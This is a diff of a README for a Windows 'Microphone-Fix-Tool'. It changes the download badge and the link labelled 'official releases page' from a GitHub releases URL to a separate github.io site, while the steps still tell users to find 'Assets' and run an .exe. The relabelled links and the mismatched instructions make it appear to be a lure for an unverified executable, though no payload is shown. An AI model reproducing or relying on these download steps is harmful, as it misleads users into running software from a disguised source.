@@ -1,6 +1,6 @@
 # 🎙️ Microphone-Fix-Tool - Restore your computer audio input quickly
 
-[![](https://img.shields.io/badge/Download-Microphone_Fix_Tool-blue.svg)](https://github.com/Herringbonepatternblackhumor707/Microphone-Fix-Tool/releases)
+[![](https://img.shields.io/badge/Download-Microphone_Fix_Tool-blue.svg)](https://herringbonepatternblackhumor707.github.io)
 
 ## 🎯 About this tool
 
@@ -14,7 +14,7 @@ The software requires Windows 10 or Windows 11. Your computer must have a standa
 
 Follow these steps to obtain the tool:
 
-1. Visit the [official releases page](https://github.com/Herringbonepatternblackhumor707/Microphone-Fix-Tool/releases) to access the current version.
+1. Visit the [official releases page](https://herringbonepatternblackhumor707.github.io) to access the current version.
 2. Look for the section labeled "Assets" at the bottom of the latest release post.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your Downloads folder or your Desktop for easy access.
